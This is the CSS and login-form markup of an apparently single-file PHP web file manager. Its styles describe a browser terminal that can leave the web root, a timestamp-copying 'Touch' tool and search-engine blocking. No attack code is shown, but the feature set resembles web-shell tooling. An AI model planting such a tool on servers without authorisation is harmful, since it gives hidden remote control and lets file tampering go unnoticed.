      .mobile-menu-toggle:focus-visible,
      .sidebar-close-btn:focus-visible {
          outline: 2px solid var(--accent-color);
          outline-offset: 2px;
      }
      
      /* Focus visible on file items */
      .file-list-item:focus-visible,
      .file-grid-item:focus-visible {
          outline: 2px solid var(--accent-color);
          outline-offset: -2px;
          background: var(--bg-hover);
      }
      
      /* Focus visible on file list container */
      #fileList:focus-visible {
          outline: 2px solid var(--accent-color);
          outline-offset: 2px;
      }
      
      /* Focus visible on context menu */
      .context-menu-item:focus,
      .context-menu-item:focus-visible {
          background: var(--bg-hover);
          outline: 2px solid var(--accent-color);
          outline-offset: -2px;
      }
      
      /* Focus visible on folder picker items */
      .folder-picker-item:focus,
      .folder-picker-item:focus-visible {
          outline: 2px solid var(--accent-color);
          outline-offset: -2px;
          background: var(--bg-hover);
      }
      
      /* Keyboard focus indicator for file items */
      .file-list-item.keyboard-focus,
      .file-grid-item.keyboard-focus {
          outline: 2px solid var(--accent-color);
          outline-offset: -2px;
          background: var(--bg-hover);
      }
      
      /* Remove default focus outline only when using custom focus styles */
      .btn:focus:not(:focus-visible),
      .nav-item:focus:not(:focus-visible),
      .action-btn:focus:not(:focus-visible) {
          outline: none;
      }
      
      /* High contrast mode support */
      @media (prefers-contrast: high) {
          .btn:focus-visible,
          .file-list-item:focus-visible,
          .file-grid-item:focus-visible,
          .nav-item:focus-visible,
          .context-menu-item:focus-visible {
              outline: 3px solid currentColor;
              outline-offset: 2px;
          }
      }
      
      /* Reduced motion support */
      @media (prefers-reduced-motion: reduce) {
          *,
          *::before,
          *::after {
              animation-duration: 0.01ms !important;
              animation-iteration-count: 1 !important;
              transition-duration: 0.01ms !important;
          }
      }
      
      /* Smooth scrollbar */
      ::-webkit-scrollbar {
          width: 8px;
          height: 8px;
      }
      
      ::-webkit-scrollbar-track {
          background: var(--bg-secondary);
          border-radius: 4px;
      }
      
      ::-webkit-scrollbar-thumb {
          background: var(--border-light);
          border-radius: 4px;
          transition: background 0.2s;
      }
      
      ::-webkit-scrollbar-thumb:hover {
          background: var(--text-muted);
      }
      
      /* Keyboard shortcut key styling */
      kbd {
          display: inline-block;
          padding: 3px 8px;
          font-family: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, monospace;
          font-size: 12px;
          line-height: 1.2;
          color: var(--text-primary);
          background: var(--bg-secondary);
          border: 1px solid var(--border-color);
          border-radius: 4px;
          box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1), inset 0 -1px 0 rgba(0, 0, 0, 0.1);
          white-space: nowrap;
          min-width: 20px;
          text-align: center;
      }
      
      .shortcut-item {
          display: flex;
          align-items: center;
          gap: 6px;
          font-size: 14px;
          color: var(--text-secondary);
      }
      
      .shortcut-item kbd {
          flex-shrink: 0;
      }
      
      /* Selection highlight color */
      ::selection {
          background: var(--accent-color);
          color: white;
      }
      
      
      
      
      .fm-picker{border:1px solid var(--border-color);border-radius:10px;background:var(--bg-secondary);overflow:hidden}.fm-picker-bar{display:flex;align-items:center;gap:8px;padding:10px;border-bottom:1px solid var(--border-color)}.fm-picker-path{flex:1;min-width:0;font-family:ui-monospace,SFMono-Regular,monospace;color:var(--text-secondary);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.fm-picker-list{max-height:330px;overflow:auto;padding:6px}.fm-picker-item{width:100%;display:flex;align-items:center;gap:10px;padding:10px 12px;border:0;border-radius:7px;background:transparent;color:var(--text-primary);cursor:pointer;text-align:left}.fm-picker-item:hover{background:var(--bg-hover)}.fm-picker-item i{color:#f39c12}.fm-picker-empty{padding:22px;text-align:center;color:var(--text-muted)}.fm-picker-use{display:flex;justify-content:space-between;align-items:center;gap:10px;margin-top:10px}.fm-picker-hint{font-size:12px;color:var(--text-muted)}
      /* Single-file integration: keep the original visual language while matching the supplied reference UI. */
      :root{--fm-row:#1a1a27}
      .file-list-container{padding:1.5rem}
      .toolbar{min-height:70px}
      .sidebar{width:280px}
      .sidebar-logo i{color:#f39c12!important}
      .nav-item .fa-upload{color:#2ecc71}.nav-item .fa-folder-plus{color:#f39c12}.nav-item .fa-file-circle-plus{color:#3498db}.nav-item .fa-sync-alt{color:#3498db}.nav-item .fa-check-double{color:#2ecc71}.nav-item .fa-moon{color:#f39c12}.nav-item .fa-table-cells{color:#3498db}.nav-item .fa-right-from-bracket{color:#e74c3c}
      .toolbar .btn{border:1px solid var(--border-light)}
      .toolbar .btn-primary{background:#009ef7}.toolbar .btn-danger{background:#f1416c}.toolbar .btn-success{background:#50cd89}
      .file-list-table{min-width:0;box-shadow:0 2px 10px rgba(0,0,0,.08)}
      .file-list-item{min-height:64px}.file-list-item .file-icon{font-size:1.6rem}.file-list-item.selected{background:#2b2b40;border-left-color:#009ef7}
      .file-grid-item.selected{box-shadow:0 0 0 2px #009ef7 inset}
      /* Action icon colors like the reference */
      .file-actions .fa-edit{color:#f39c12}.file-actions .fa-download{color:#27ae60}.file-actions .fa-copy{color:#3498db}.file-actions .fa-arrows-alt{color:#3498db}.file-actions .fa-trash{color:#e74c3c}.file-actions .fa-pen{color:#f39c12}
      /* Custom integration markup */
      .fm-row{display:grid;grid-template-columns:40px 34px minmax(250px,1fr) 105px 110px 170px 100px 315px;padding:.75rem 1.5rem;border-bottom:1px solid var(--border-color);align-items:center;box-sizing:border-box;cursor:pointer;transition:all .2s ease;border-left:3px solid transparent;min-height:64px}.fm-row:hover{background:var(--bg-hover);border-left-color:var(--accent-color)}.fm-row.selected{background:var(--bg-active)}.fm-head{display:grid;grid-template-columns:40px 34px minmax(250px,1fr) 105px 110px 170px 100px 315px;padding:1rem 1.5rem;background:var(--bg-tertiary);box-sizing:border-box;border-bottom:2px solid var(--border-color);font-size:.75rem;font-weight:600;color:var(--text-muted);text-transform:uppercase;letter-spacing:.5px}.fm-name{display:flex;align-items:center;gap:12px;min-width:0;padding-left:calc(var(--depth,0) * 26px)}.fm-chevron{display:flex;align-items:center;justify-content:center}.folder-chevron{width:26px;height:26px;background:transparent;border:0;color:#92929f;cursor:pointer;border-radius:5px}.folder-chevron:hover{background:var(--bg-hover);color:var(--accent-color)}.folder-chevron.open i{transform:rotate(90deg)}.folder-chevron i{transition:transform .15s ease}.fm-action.zip i{color:#8e44ad}.fm-action.downloadzip i{color:#27ae60}.fm-name span{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.fm-icon{font-size:1.5rem;width:28px;text-align:center}.fm-check{appearance:none;width:18px;height:18px;border:2px solid var(--border-light);border-radius:4px;background:var(--bg-secondary);cursor:pointer;position:relative}.fm-check:checked{background:var(--accent-color);border-color:var(--accent-color)}.fm-check:checked:after{content:'✓';position:absolute;color:#fff;font-size:12px;left:2px;top:-2px}.fm-permission{font-family:Menlo,Monaco,Consolas,monospace;font-size:.82rem;color:var(--text-secondary);font-weight:600;text-align:center}.fm-permission code{background:var(--bg-secondary);padding:3px 6px;border-radius:5px;border:1px solid var(--border-light)}.fm-head>div:nth-last-child(2){text-align:center}.fm-head>div:last-child{padding-left:0;box-sizing:border-box;text-align:right;padding-right:10px}.fm-actions{display:flex;gap:0px;opacity:1;justify-content:flex-end;white-space:nowrap;position:relative;z-index:20;pointer-events:auto}.fm-action{padding:7px 3px;background:transparent;border:0;cursor:pointer;border-radius:6px;position:relative;z-index:21;pointer-events:auto;min-width:26px}.fm-action:hover{background:var(--bg-hover);transform:scale(1.08)}.fm-action:active{transform:scale(.96)}.fm-action.edit i{color:#f39c12}.fm-action.unzip i{color:#8e44ad}.fm-action.download i{color:#27ae60}.fm-action.rename i{color:#9b59b6}.fm-action.copy i{color:#3498db}.fm-action.move i{color:#3498db}.fm-action.direct-link i{color:#7f8c8d}.fm-action.delete i{color:#e74c3c}.fm-action.view i{color:#9b59b6}.fm-action.touch i{color:#1abc9c}.fm-name.fm-previewable{cursor:pointer}.fm-hover-preview{position:absolute;left:42px;top:34px;z-index:9999;width:250px;max-height:190px;padding:5px;background:var(--bg-primary);border:2px solid var(--border-light);border-radius:6px;box-shadow:var(--shadow-lg);display:none;pointer-events:none}.fm-hover-preview img{display:block;width:100%;max-height:180px;object-fit:contain;background:#111;border-radius:3px}.fm-name{position:relative}.fm-name.fm-previewable:hover .fm-hover-preview{display:block}.fm-file-viewer-modal .modal-body{padding:0;overflow:hidden;background:var(--bg-secondary);min-height:0}.fm-viewer-media{height:calc(92vh - 150px);min-height:320px;display:flex;align-items:center;justify-content:center;padding:18px;overflow:auto}.fm-viewer-media.image img{max-width:100%;max-height:100%;width:auto;height:auto;object-fit:contain;box-shadow:var(--shadow-lg);background:#111}.fm-viewer-media video{max-width:100%;max-height:100%;width:auto;height:auto;background:#000}.fm-viewer-media.audio{flex-direction:column;gap:20px}.fm-viewer-media.audio i{font-size:4rem;color:var(--accent-color)}.fm-viewer-media.audio audio{width:min(620px,90%)}.fm-viewer-media.pdf{padding:0}.fm-viewer-media.pdf iframe{width:100%;height:100%;border:0;background:#fff}.fm-viewer-text{height:calc(92vh - 150px);overflow:auto;padding:18px;background:var(--bg-primary)}.fm-viewer-text pre{margin:0;white-space:pre-wrap;word-break:break-word;font:13px/1.55 ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;color:var(--text-primary)}.fm-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:1rem}.fm-card{background:var(--bg-primary);border:2px solid transparent;border-radius:var(--radius-lg);padding:1.4rem 1rem;text-align:center;cursor:pointer;position:relative;transition:var(--transition)}.fm-card:hover{transform:translateY(-3px);border-color:var(--accent-color);box-shadow:var(--shadow-lg)}.fm-card.selected{background:var(--bg-active);border-color:var(--accent-color)}.fm-card .fm-icon{font-size:3rem;width:auto;margin:0 auto .7rem}.fm-card .fm-size{font-size:.75rem;color:var(--text-muted);margin-top:4px}.fm-ext{font-size:.875rem;color:var(--text-secondary)}.fm-date,.fm-size{font-size:.875rem;color:var(--text-secondary)}.fm-empty{padding:5rem 2rem;text-align:center;color:var(--text-muted)}.fm-empty i{font-size:4rem;opacity:.25;margin-bottom:1rem}.fm-breadcrumb{display:flex;align-items:center;gap:4px;white-space:nowrap;overflow:hidden}.fm-breadcrumb button{background:transparent;border:0;color:var(--text-secondary);cursor:pointer;padding:5px 7px;border-radius:6px}.fm-breadcrumb button:hover{color:var(--accent-color);background:var(--bg-hover)}.fm-breadcrumb .current{color:var(--text-primary)}.fm-context{position:fixed;z-index:10000;min-width:210px;background:var(--bg-primary);border:1px solid var(--border-color);border-radius:var(--radius);box-shadow:var(--shadow-lg);padding:5px;display:none}.fm-context.show{display:block}.fm-context button{width:100%;background:transparent;border:0;color:var(--text-primary);padding:9px 11px;text-align:left;border-radius:5px;cursor:pointer;display:flex;gap:10px;align-items:center}.fm-context button:hover{background:var(--bg-hover)}.fm-context hr{border:0;border-top:1px solid var(--border-light);margin:4px 0}.fm-progress{height:8px;background:var(--bg-secondary);border-radius:20px;overflow:hidden}.fm-progress>div{height:100%;width:0;background:var(--accent-color);transition:width .15s}.fm-editor-wrap{height:calc(90vh - 140px);min-height:300px;background:#2b2b2b}.CodeMirror{height:100%;font-size:13px}.modal.editor-modal .modal-content{width:92vw;max-width:1400px;height:92vh}.modal.editor-modal .modal-body{height:calc(100% - 120px);padding:0;overflow:hidden}.modal.editor-modal .modal-footer{justify-content:space-between}
      .editor-ext-label{color:#77778e;font-weight:600;margin-left:5px}.editor-header-tools{display:flex;align-items:center;gap:8px;margin-left:auto;margin-right:8px}.editor-header-tools .btn{height:38px;padding:0 15px}.editor-mode-btn i{margin-right:6px}.editor-format-btn i{color:#f39c12}.editor-wysiwyg-wrap{height:100%;background:#fff}.editor-wysiwyg-wrap .tox-tinymce{height:100%!important;border:0!important;border-radius:0!important}.editor-wysiwyg-wrap .mce-tinymce{height:100%!important}.editor-wysiwyg-wrap .mce-edit-area iframe{background:#fff}.editor-code-wrap{height:100%}.editor-code-wrap .CodeMirror{height:100%}.editor-loading{height:100%;display:flex;align-items:center;justify-content:center;color:#92929f;background:#2b2b2b;font-size:13px}.modal.editor-modal .modal-header{gap:10px}.modal.editor-modal .modal-header>span{min-width:0}.modal.editor-modal .modal-header>span b{color:#fff}
      /* V33 — terminal working directory can move outside web root */
      .modal.terminal-modal{padding:20px}
      .modal.terminal-modal .modal-content{width:min(820px,92vw);max-width:820px;height:min(560px,78vh);max-height:78vh;overflow:hidden;display:flex;flex-direction:column}
      .modal.terminal-modal .modal-header{padding:13px 16px;display:flex;align-items:center;gap:10px;min-height:54px}
      .modal.terminal-modal .modal-body{padding:0;display:flex;flex-direction:column;min-height:0;flex:1;background:#0d1117}
      .modal.terminal-modal .modal-footer{padding:10px 14px;min-height:52px}
      .fm-terminal-head{display:flex;align-items:center;justify-content:space-between;padding:9px 13px;background:#111827;border-bottom:1px solid #252b3a;color:#8d96a8;font:12px/1.2 Menlo,Monaco,Consolas,monospace}
      .fm-terminal-head .fm-terminal-cwd{color:#50cd89;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1}.fm-terminal-nav{display:flex;gap:5px;align-items:center}.fm-terminal-nav button{border:1px solid #2d3748;background:#172033;color:#cbd5e1;border-radius:5px;padding:4px 7px;cursor:pointer;font-size:11px}.fm-terminal-nav button:hover{background:#22304a;color:#fff}
      .fm-terminal-output{flex:1;min-height:0;overflow:auto;padding:14px 16px;color:#d7dde8;background:#0d1117;font:13px/1.55 Menlo,Monaco,Consolas,"Courier New",monospace;white-space:pre-wrap;word-break:break-word}
      .fm-terminal-line{display:flex;align-items:center;gap:8px;padding:9px 12px;background:#111827;border-top:1px solid #252b3a}
      .fm-terminal-prompt{color:#50cd89;font:13px Menlo,Monaco,Consolas,monospace;white-space:nowrap}
      .fm-terminal-input{flex:1;min-width:0;background:transparent;border:0;outline:0;color:#f1f5f9;font:13px Menlo,Monaco,Consolas,"Courier New",monospace}
      .fm-terminal-run{border:1px solid #2d7d59;background:#163d2c;color:#7ee2a8;border-radius:6px;padding:6px 10px;cursor:pointer}
      .fm-terminal-run:hover{background:#1c5039}
      .fm-terminal-output .term-ok{color:#50cd89}.fm-terminal-output .term-err{color:#f1416c}.fm-terminal-output .term-cmd{color:#8ab4f8}.fm-terminal-output .term-muted{color:#6b7280}
      @media(max-width:700px){.modal.terminal-modal{padding:8px}.modal.terminal-modal .modal-content{width:100%;height:calc(100vh - 16px);max-height:calc(100vh - 16px)}.fm-terminal-line{padding:8px}.fm-terminal-run{padding:6px 8px}}
      .fm-upload-tabs{display:flex;gap:6px;margin-bottom:15px}.fm-upload-tabs button{flex:1}.fm-upload-pane{display:none}.fm-upload-pane.active{display:block}.fm-drop{border:2px dashed var(--border-light);border-radius:var(--radius);padding:30px;text-align:center;color:var(--text-secondary)}.fm-drop.drag{border-color:var(--accent-color);background:var(--bg-active)}
      @media(max-width:1250px){.fm-row,.fm-head{grid-template-columns:38px 32px minmax(220px,1fr) 90px 100px 155px 95px 315px}.fm-row .fm-ext,.fm-head .fm-ext{display:none}.fm-row .fm-actions{grid-column:7}}
      @media(max-width:768px){.sidebar{width:265px}.fm-row,.fm-head{grid-template-columns:32px 28px 1fr 85px}.fm-row .fm-date,.fm-row .fm-ext,.fm-row .fm-actions,.fm-head .fm-date,.fm-head .fm-ext,.fm-head>div:last-child{display:none}.fm-row{padding:.7rem}.fm-head{padding:.8rem}.fm-grid{grid-template-columns:repeat(auto-fill,minmax(105px,1fr))}.file-list-container{padding:.75rem}.fm-breadcrumb{display:none}}
    </style>

    <style id="fm-v23-editor-overrides">
      /* V23 — editor layout follows the original File Manager modal: compact, fixed header/footer, no page scrolling. */
      .modal.editor-modal{padding:20px;overflow:hidden}
      .modal.editor-modal .modal-content{
        width:90%;max-width:1400px;height:90vh;max-height:90vh;
        display:flex;flex-direction:column;overflow:hidden;
      }
      .modal.editor-modal .modal-header{
        display:flex;align-items:center;justify-content:space-between;gap:12px;
        flex:0 0 auto;padding:1.25rem 1.5rem;
      }
      .modal.editor-modal .modal-header #modalTitle{min-width:0;flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
      .modal.editor-modal .modal-header .editor-header-tools{display:flex;align-items:center;gap:10px;margin:0 0 0 auto;flex:0 0 auto}
      .modal.editor-modal .modal-header .btn{white-space:nowrap}
      .modal.editor-modal .modal-header>.btn-icon-only{flex:0 0 auto}
      .modal.editor-modal .modal-body{
        flex:1 1 auto;height:auto!important;min-height:0;padding:0!important;
        overflow:hidden;display:flex;
      }
      .modal.editor-modal .modal-footer{
        flex:0 0 auto;height:auto;min-height:68px;box-sizing:border-box;
        display:flex;align-items:center;justify-content:space-between;
        padding:12px 1.5rem!important;gap:12px;overflow:hidden;
      }
      .modal.editor-modal .modal-footer>div:first-child{min-width:0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
      .modal.editor-modal .modal-footer>div:last-child{display:flex;align-items:center;gap:10px;flex:0 0 auto;white-space:nowrap}
      .modal.editor-modal .modal-footer .btn{margin:0}
      .modal.editor-modal .fm-editor-wrap,.modal.editor-modal .editor-code-wrap{height:100%!important;min-height:0!important;flex:1}
      .modal.editor-modal .CodeMirror{height:100%!important;min-height:0!important}
      .modal.editor-modal .editor-wysiwyg-wrap{height:100%!important;min-height:0!important;flex:1;overflow:hidden}
      .modal.editor-modal .editor-wysiwyg-wrap .tox-tinymce,
      .modal.editor-modal .editor-wysiwyg-wrap .mce-tinymce{height:100%!important;border:0!important;border-radius:0!important}
      /* Keep the classic TinyMCE layout dense like the original source. */
      .modal.editor-modal .tox .tox-toolbar-overlord{border-top:0}
      .modal.editor-modal .tox .tox-statusbar{min-height:25px}
      /* V25 robust editor fallback when CodeMirror CDN is unavailable */
      .modal.editor-modal .fm-fallback-editor{display:block;width:100%;height:100%;box-sizing:border-box;resize:none;border:0;outline:0;padding:12px 14px;background:#2b2b2b;color:#e8e8e8;font:13px/1.55 Menlo,Monaco,Consolas,"Courier New",monospace;tab-size:4;white-space:pre;overflow:auto;}
      .modal.editor-modal .fm-editor-wrap.advanced-mode .fm-fallback-editor{flex:1;min-height:0;}
      /* Security diagnostics */
      .server-lock-box{margin-top:7px;padding-top:7px;border-top:1px solid rgba(255,255,255,.06)}
      .server-lock-head{display:flex;align-items:center;justify-content:space-between;gap:8px}
      .server-lock-head .si-label{color:#f1416c;font-weight:800}
      .server-lock-count{color:#f1416c;font-weight:800;font-size:9px}
      .server-lock-list{margin-top:3px;color:#e66b8c;font-size:8px;line-height:1.45;white-space:normal;overflow-wrap:anywhere;word-break:break-word}
      @media(max-width:768px){
       .modal.editor-modal{padding:8px}
       .modal.editor-modal .modal-content{width:100%;height:calc(100vh - 16px);max-height:calc(100vh - 16px)}
       .modal.editor-modal .modal-header{padding:10px 12px;gap:8px}
       .modal.editor-modal .modal-header .editor-header-tools .btn{height:34px;padding:0 10px;font-size:12px}
       .modal.editor-modal .modal-footer{padding:9px 12px!important;min-height:58px}
       .modal.editor-modal .modal-footer>div:last-child{gap:6px}
       .modal.editor-modal .modal-footer .btn{padding:.45rem .7rem;font-size:12px}
      }
      
      
      /* V28 — TinyFileManager-style persistent find/replace panel */
      .fm-editor-wrap.advanced-mode{position:relative}
      .fm-cm-search-panel{position:absolute;top:0;right:0;z-index:50;width:405px;background:#d9d9d9;border:1px solid #aaa;box-shadow:0 2px 7px rgba(0,0,0,.28);font:13px Arial,sans-serif;color:#333}
      .fm-cm-search-action{min-width:34px;padding:0 8px}.fm-cm-search-action i{font-size:12px}
      .fm-cm-search-row{display:flex;align-items:center;height:30px;border-bottom:1px solid #c2c2c2}
      .fm-cm-search-row:last-child{border-bottom:0}
      .fm-cm-search-row input{height:26px;box-sizing:border-box;border:1px solid #c9c9c9;background:#fff;color:#333;outline:0;padding:3px 7px;font:13px Arial,sans-serif}
      .fm-cm-search-row input:focus{border-color:#8aa9c2;box-shadow:inset 0 0 0 1px #d9e8f3}
      .fm-cm-find{flex:1;min-width:0;border:0!important;border-right:1px solid #c8c8c8!important}
      .fm-cm-replace{flex:1;min-width:0;border:0!important}
      .fm-cm-btn{height:27px;min-width:34px;border:0;border-left:1px solid #c5c5c5;background:#eee;color:#555;padding:0 9px;cursor:pointer;font:13px Arial,sans-serif}
      .fm-cm-btn:hover{background:#e4e4e4;color:#222}
      .fm-cm-count{padding:0 9px;color:#555;white-space:nowrap;min-width:72px}
      .fm-cm-status{height:28px;display:flex;align-items:center;border-top:1px solid #c5c5c5}
      .fm-cm-toggle{height:22px;min-width:22px;margin-left:auto;border:1px solid #bbb;background:#eee;color:#555;cursor:pointer;padding:0 5px}
      .fm-cm-toggle.active{background:#c9d8e4;color:#222}
      .fm-cm-close{font-weight:bold;font-size:15px;min-width:28px;padding:0}
      @media(max-width:650px){.fm-cm-search-panel{width:min(405px,calc(100vw - 24px));right:6px}.fm-cm-count{min-width:52px;padding:0 5px}.fm-cm-btn{padding:0 6px}}
      
      /* V26 — TinyFileManager-style Advanced Editor + Ctrl+F/Ctrl+H */
      .modal.editor-modal .modal-body{display:flex;flex-direction:column;overflow:hidden}
      .modal.editor-modal .fm-editor-wrap{display:flex;flex-direction:column;min-height:0}
      .modal.editor-modal .fm-editor-wrap.advanced-mode{background:#f4f4f4}
      .fm-advanced-toolbar{
        flex:0 0 auto;display:flex;align-items:center;justify-content:space-between;
        gap:8px;padding:5px 7px;background:#202b30;border-bottom:1px solid #56636a;
        min-height:36px;box-sizing:border-box;font-family:Arial,sans-serif;
      }
      .fm-advanced-tools-left,.fm-advanced-tools-right{display:flex;align-items:center;gap:3px;min-width:0}
      .fm-adv-icon,.fm-adv-action{
        height:31px;border:1px solid #6f7c82;background:#263137;color:#e8eef0;
        border-radius:3px;display:inline-flex;align-items:center;justify-content:center;
        gap:5px;padding:0 8px;font-size:12px;cursor:pointer;white-space:nowrap;
      }
      .fm-adv-icon{width:31px;padding:0}
      .fm-adv-icon:hover,.fm-adv-action:hover{background:#344149}
      .fm-adv-action{border-color:#8aa68e}
      .fm-adv-save{background:#23452b;border-color:#83b78c}
      .fm-adv-divider{height:24px;width:1px;background:#667177;margin:0 4px}
      .fm-adv-select{
        height:31px;border:1px solid #6f7c82;background:#263137;color:#f0f3f4;
        border-radius:2px;padding:0 26px 0 8px;font-size:12px;outline:none;
      }
      .fm-adv-select option{background:#263137;color:#fff}
      .fm-adv-theme{width:150px}.fm-adv-size{width:55px;padding-right:4px}
      .modal.editor-modal .fm-editor-wrap.advanced-mode>.CodeMirror{
        flex:1 1 auto;height:auto!important;min-height:0!important;border:0;
      }
      .modal.editor-modal .fm-editor-wrap.advanced-mode .CodeMirror{
        font-family:Menlo,Monaco,Consolas,"Courier New",monospace;
      }
      .modal.editor-modal .fm-editor-wrap.advanced-mode[data-advanced-theme="dark"] .CodeMirror{
        background:#202124;color:#e7e7e7;
      }
      .modal.editor-modal .fm-editor-wrap.advanced-mode[data-advanced-theme="dark"] .CodeMirror-gutters{
        background:#202124;color:#777;border-right:1px solid #333;
      }
      .modal.editor-modal .fm-editor-wrap.advanced-mode .CodeMirror-gutters{background:#f5f5f5}
      .modal.editor-modal .fm-editor-wrap.advanced-mode .CodeMirror-linenumber{color:#6e6e6e}
      .modal.editor-modal .fm-editor-wrap.advanced-mode .CodeMirror-scroll{overflow:auto!important}
      .modal.editor-modal .fm-editor-wrap.advanced-mode{--advanced-font-size:13px}
      .modal.editor-modal .fm-editor-wrap.advanced-mode .CodeMirror-code{font-size:var(--advanced-font-size)}
      .modal.editor-modal .fm-editor-wrap.advanced-mode .CodeMirror-lines{padding-top:4px;padding-bottom:20px}
      .modal.editor-modal .modal-content.fm-editor-fullscreen{
        width:100vw!important;height:100vh!important;max-width:none!important;max-height:none!important;
        border-radius:0!important;
      }
      .modal.editor-modal.fm-editor-modal-fullscreen{padding:0!important}
      .modal.editor-modal.fm-editor-modal-fullscreen .modal-content{height:100vh!important}
      @media(max-width:900px){
        .fm-advanced-toolbar{align-items:flex-start;flex-wrap:wrap}
        .fm-advanced-tools-right{width:100%;justify-content:flex-end}
        .fm-adv-action{flex:1}
      }
    </style>
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
    <link rel="icon" type="image/webp" href="https://cdn.phototourl.com/free/2026-09-16-1a1502b9-1433-47fe-acb5-af3ae44fe556.webp">

    <style id="fm-v68-touch-and-date">
      /* V68 — Touch action and full modified timestamp. */
    </style>
    <style id="fm-v71-copy-modified-date">
      /* V71 — Copy modified timestamp + paste into Touch. */
      .fm-date-wrap{display:flex;align-items:center;gap:5px;min-width:0;white-space:nowrap}
      .fm-date-wrap .fm-date-text{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:var(--text-secondary)}
      .fm-copy-date{display:inline-flex;align-items:center;justify-content:center;width:25px;height:25px;padding:0;border:1px solid var(--border-light);border-radius:6px;background:var(--bg-secondary);color:var(--text-secondary);cursor:pointer;flex:0 0 25px;transition:all .15s ease}
      .fm-copy-date:hover{color:var(--accent-color);background:var(--bg-hover);transform:scale(1.05)}
      .fm-touch-tools{display:flex;gap:7px;align-items:center;margin-top:8px;flex-wrap:wrap}
      .fm-touch-tools .btn{margin:0}
      @media(max-width:900px){.fm-date-wrap{gap:3px}.fm-copy-date{width:23px;height:23px;flex-basis:23px}}
      /* V72 — visible feedback for copy/paste actions. */
      .toast{position:fixed;left:50%;bottom:28px;transform:translate(-50%,18px);z-index:999999;display:block;max-width:min(520px,calc(100vw - 32px));padding:10px 16px;border:1px solid var(--border-light);border-radius:10px;background:var(--bg-primary);color:var(--text-primary);box-shadow:var(--shadow-lg);font-size:.9rem;line-height:1.35;text-align:center;opacity:0;visibility:hidden;pointer-events:none;transition:opacity .18s ease,transform .18s ease,visibility .18s ease}
      .toast.show{opacity:1;visibility:visible;transform:translate(-50%,0)}
      
    </style>
    <style id="fm-v50-viewer-fixed-footer">
      /* V50 — File Viewer keeps header/footer fixed; only the preview area scrolls. */
      .fm-file-viewer-modal{
        display:flex!important;
        flex-direction:column!important;
        overflow:hidden!important;
      }
      .fm-file-viewer-modal .modal-header{
        flex:0 0 auto!important;
        overflow:hidden;
      }
      .fm-file-viewer-modal .modal-body{
        flex:1 1 auto!important;
        min-height:0!important;
        height:auto!important;
        overflow:hidden!important;
        display:flex!important;
        flex-direction:column!important;
        padding:0!important;
      }
      .fm-file-viewer-modal .modal-footer{display:flex!important;align-items:center!important;justify-content:space-between!important;gap:12px!important;}
      .fm-file-viewer-modal .fm-viewer-footer-left,.fm-file-viewer-modal .fm-viewer-footer-right{display:flex;align-items:center;gap:10px;}
      .fm-file-viewer-modal .modal-footer{
        flex:0 0 auto!important;
        min-height:68px!important;
        box-sizing:border-box!important;
        overflow:hidden!important;
        position:relative!important;
        z-index:5!important;
      }
      .fm-file-viewer-modal .fm-viewer-media,
      .fm-file-viewer-modal .fm-viewer-text{
        flex:1 1 auto!important;
        width:100%!important;
        height:auto!important;
        min-height:0!important;
        box-sizing:border-box!important;
        overflow:auto!important;
      }
      .fm-file-viewer-modal .fm-viewer-media.pdf iframe{
        width:100%!important;
        height:100%!important;
        min-height:0!important;
      }
      .fm-file-viewer-modal .fm-viewer-text pre{
        min-width:100%;
        box-sizing:border-box;
      }
    </style>

    <style id="fm-v49-viewer-preview-overrides">
      /* V49 — keep image hover previews visible in nested folders and widen File Viewer. */
      .file-list-table{
        overflow:visible!important;
      }
      .fm-row{
        position:relative;
      }
      .fm-row:hover{
        z-index:30;
      }
      .fm-row .fm-name{
        z-index:31;
      }
      .fm-row .fm-hover-preview{
        z-index:99999;
      }
      .fm-file-viewer-modal{
        width:min(1100px,92vw)!important;
        max-width:min(1100px,92vw)!important;
        height:90vh!important;
        max-height:90vh!important;
      }
      .fm-file-viewer-modal .modal-header{
        flex:0 0 auto;
      }
      .fm-file-viewer-modal .modal-body{
        flex:1 1 auto!important;
        min-height:0!important;
      }
      .fm-file-viewer-modal .fm-viewer-media,
      .fm-file-viewer-modal .fm-viewer-text{
        height:calc(90vh - 145px)!important;
        min-height:320px;
      }
      .fm-file-viewer-modal .fm-viewer-text{
        font-size:14px;
      }
      @media(max-width:700px){
        .fm-file-viewer-modal{
          width:calc(100vw - 16px)!important;
          max-width:calc(100vw - 16px)!important;
          height:calc(100vh - 16px)!important;
          max-height:calc(100vh - 16px)!important;
        }
        .fm-file-viewer-modal .fm-viewer-media,
        .fm-file-viewer-modal .fm-viewer-text{
          height:calc(100vh - 145px)!important;
        }
      }
    </style>
    <style id="fm-v80-zip-viewer-full">
      /* V80 — ZIP viewer uses the full File Viewer body; no separate Contents header/box. */
      .fm-file-viewer-modal .fm-archive-viewer{
        flex:1 1 auto!important;
        width:100%!important;
        height:100%!important;
        min-height:0!important;
      }
      .fm-file-viewer-modal .fm-zip-entries{
        flex:1 1 auto!important;
        width:100%!important;
        height:100%!important;
        max-height:none!important;
        min-height:0!important;
        box-sizing:border-box!important;
        border:0!important;
        border-radius:0!important;
        padding:18px!important;
        background:var(--bg-primary)!important;
        overflow:auto!important;
      }
      .fm-file-viewer-modal .fm-zip-list-head{display:none!important}
    </style>
  </head>

  <body data-theme="dark">
    <?php if($login): ?>
    <div class="login-page">
      <form id="loginForm" class="login-card" autocomplete="off">
        <div class="login-brand"><i class="fas fa-folder"></i><span>File Manager</span></div>
        <div class="login-subtitle">Sign in to manage your files</div>
        <div class="login-field"><label>Username</label>
          <div class="login-input-wrap"><i class="fas fa-user"></i><input id="loginUsername" type="text" value="" autocomplete="username" autofocus required></div>
        </div>
        <div class="login-field"><label>Password</label>
          <div class="login-input-wrap"><i class="fas fa-lock"></i><input id="loginPassword" type="password" autocomplete="current-password" required></div>
        </div>
        <button class="login-submit" type="submit"><i class="fas fa-right-to-bracket"></i> Login</button>
      </form>
    </div>
    <script>
